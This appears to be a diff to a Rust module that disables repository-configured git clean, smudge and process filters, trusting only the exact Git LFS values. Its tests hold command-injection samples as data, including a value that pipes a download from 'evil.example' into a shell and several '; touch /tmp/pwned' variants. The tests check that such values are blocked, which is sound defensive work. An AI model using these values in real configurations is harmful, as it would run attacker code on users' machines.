@@ -51,43 +51,45 @@ fn run(
     input: Option<&[u8]>,
     success_codes: &[i32],
 ) -> Result<Vec<u8>, Error> {
-    let overrides = untrusted_filter_overrides(dir);
+    // Fail closed: if we can't tell which filters the repo configured, run nothing.
+    let overrides = untrusted_filter_overrides(dir)?;
     exec(dir, &overrides, args, input, success_codes)
 }
 
 /// `-c filter.<name>.<command>=` arguments that disable filters the repo configured.
-fn untrusted_filter_overrides(dir: &Path) -> Vec<String> {
-    // Reading config runs nothing, so this call itself needs no overrides.
-    let Ok(output) = exec(
+fn untrusted_filter_overrides(dir: &Path) -> Result<Vec<String>, Error> {
+    // Reading config runs nothing, so this call itself needs no overrides. Exit code 1
+    // just means no filters are configured.
+    let output = exec(
         dir,
         &[],
-        &["config", "--show-scope", "--get-regexp", r"^filter\."],
+        &["config", "-z", "--show-scope", "--get-regexp", r"^filter\."],
         None,
         &[0, 1],
-    ) else {
-        return Vec::new();
-    };
-    blank_untrusted_filters(&String::from_utf8_lossy(&output))
+    )?;
+    Ok(blank_untrusted_filters(&String::from_utf8_lossy(&output)))
 }
 
-/// Parses `git config --show-scope --get-regexp` output (`scope<TAB>key value`).
+/// Parses `git config -z --show-scope --get-regexp` output, which is a series of
+/// `scope NUL key NEWLINE value NUL` records. A value may itself contain newlines,
+/// so it can't be mistaken for another entry.
 fn blank_untrusted_filters(config: &str) -> Vec<String> {
     let mut overrides = Vec::new();
-    for line in config.lines() {
-        let Some((scope, entry)) = line.split_once('\t') else {
-            continue;
-        };
+    let mut fields = config.split('\0');
+    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
         if !matches!(scope, "local" | "worktree") {
             continue;
         }
-        let (key, value) = entry.split_once(' ').unwrap_or((entry, ""));
+        let (key, value) = entry.split_once('\n').unwrap_or((entry, ""));
         let Some((driver, command)) = key
             .strip_prefix("filter.")
             .and_then(|rest| rest.rsplit_once('.'))
         else {
             continue;
         };
-        if !matches!(command, "clean" | "smudge" | "process") || is_lfs_command(value) {
+        if !matches!(command, "clean" | "smudge" | "process")
+            || is_canonical_lfs(driver, command, value)
+        {
             continue;
         }
         overrides.push("-c".to_owned());
@@ -96,10 +98,20 @@ fn blank_untrusted_filters(config: &str) -> Vec<String> {
     overrides
 }
 
-/// Git LFS is the one common filter installed per repository, and blanking it
-/// would make every large file look modified.
-fn is_lfs_command(command: &str) -> bool {
-    command.trim_start().starts_with("git-lfs ")
+/// Git LFS is the one common filter installed per repository, and blanking it would
+/// make every large file look modified. Only the driver named `lfs` with exactly the
+/// values `git lfs install` writes is trusted: git runs these strings through a shell,
+/// so anything looser (a prefix match, extra arguments) could smuggle in a command.
+fn is_canonical_lfs(driver: &str, command: &str, value: &str) -> bool {
+    driver == "lfs"
+        && matches!(
+            (command, value),
+            ("clean", "git-lfs clean -- %f")
+                | ("smudge", "git-lfs smudge -- %f")
+                | ("smudge", "git-lfs smudge --skip -- %f")
+                | ("process", "git-lfs filter-process")
+                | ("process", "git-lfs filter-process --skip")
+        )
 }
 
 fn exec(
@@ -152,43 +164,104 @@ fn exec(
 mod tests {
     use super::*;
 
+    /// Builds `git config -z --show-scope` output.
+    fn config(entries: &[(&str, &str, &str)]) -> String {
+        entries
+            .iter()
+            .map(|(scope, key, value)| format!("{scope}\0{key}\n{value}\0"))
+            .collect()
+    }
+
     #[test]
     fn blanks_repo_scoped_filters_only() {
-        let config = "local\tfilter.evil.clean /tmp/evil.sh\n\
-                      global\tfilter.mine.clean my-clean\n\
-                      worktree\tfilter.wt.smudge /tmp/wt.sh\n\
-                      system\tfilter.sys.process sys-filter\n";
+        let output = config(&[
+            ("local", "filter.evil.clean", "/tmp/evil.sh"),
+            ("global", "filter.mine.clean", "my-clean"),
+            ("worktree", "filter.wt.smudge", "/tmp/wt.sh"),
+            ("system", "filter.sys.process", "sys-filter"),
+        ]);
         assert_eq!(
-            blank_untrusted_filters(config),
+            blank_untrusted_filters(&output),
             ["-c", "filter.evil.clean=", "-c", "filter.wt.smudge="]
         );
     }
 
     #[test]
-    fn keeps_git_lfs_filters() {
-        let config = "local\tfilter.lfs.clean git-lfs clean -- %f\n\
-                      local\tfilter.lfs.process git-lfs filter-process\n\
-                      local\tfilter.lfs.required true\n";
-        assert!(blank_untrusted_filters(config).is_empty());
+    fn keeps_exactly_the_canonical_lfs_filters() {
+        let output = config(&[
+            ("local", "filter.lfs.clean", "git-lfs clean -- %f"),
+            ("local", "filter.lfs.smudge", "git-lfs smudge -- %f"),
+            ("local", "filter.lfs.process", "git-lfs filter-process"),
+            ("local", "filter.lfs.required", "true"),
+        ]);
+        assert!(blank_untrusted_filters(&output).is_empty());
+    }
+
+    #[test]
+    fn an_lfs_lookalike_that_adds_a_command_is_blanked() {
+        // Git runs these through a shell, so a trailing `; ...` would execute.
+        for value in [
+            "git-lfs clean -- %f; touch /tmp/pwned",
+            "git-lfs clean -- %f && curl evil.example | sh",
+            "git-lfs clean -- %f\ntouch /tmp/pwned",
+            "git-lfs clean -- %f ",
+            "git-lfs clean",
+            "git-lfs-evil clean -- %f",
+        ] {
+            let output = config(&[("local", "filter.lfs.clean", value)]);
+            assert_eq!(
+                blank_untrusted_filters(&output),
+                ["-c", "filter.lfs.clean="],
+                "{value:?} was trusted"
+            );
+        }
+    }
+
+    #[test]
+    fn the_lfs_command_is_only_trusted_on_the_driver_named_lfs() {
+        let output = config(&[("local", "filter.other.clean", "git-lfs clean -- %f")]);
+        assert_eq!(
+            blank_untrusted_filters(&output),
+            ["-c", "filter.other.clean="]
+        );
+    }
+
+    #[test]
+    fn a_value_cannot_forge_another_entry() {
+        // The multi-line value contains text that looks like a global (trusted) entry.
+        let output = config(&[(
+            "local",
+            "filter.evil.clean",
+            "x\nglobal\0filter.evil.clean\nsafe",
+        )]);
+        assert_eq!(
+            blank_untrusted_filters(&output),
+            ["-c", "filter.evil.clean="]
+        );
     }
 
     #[test]
     fn only_clean_smudge_and_process_are_blanked() {
-        let config = "local\tfilter.x.required true\nlocal\tfilter.x.clean run-me\n";
-        assert_eq!(blank_untrusted_filters(config), ["-c", "filter.x.clean="]);
+        let output = config(&[
+            ("local", "filter.x.required", "true"),
+            ("local", "filter.x.clean", "run-me"),
+        ]);
+        assert_eq!(blank_untrusted_filters(&output), ["-c", "filter.x.clean="]);
     }
 
     #[test]
     fn driver_names_containing_dots_are_handled() {
-        let config = "local\tfilter.my.driver.clean run-me\n";
+        let output = config(&[("local", "filter.my.driver.clean", "run-me")]);
         assert_eq!(
-            blank_untrusted_filters(config),
+            blank_untrusted_filters(&output),
             ["-c", "filter.my.driver.clean="]
         );
     }
 
     #[test]
-    fn malformed_lines_are_ignored() {
-        assert!(blank_untrusted_filters("garbage\n\nlocal\tnot-a-filter x\n").is_empty());
+    fn empty_and_malformed_output_blanks_nothing() {
+        assert!(blank_untrusted_filters("").is_empty());
+        assert!(blank_untrusted_filters("local").is_empty());
+        assert!(blank_untrusted_filters("local\0not-a-filter\nx\0").is_empty());
     }
 }
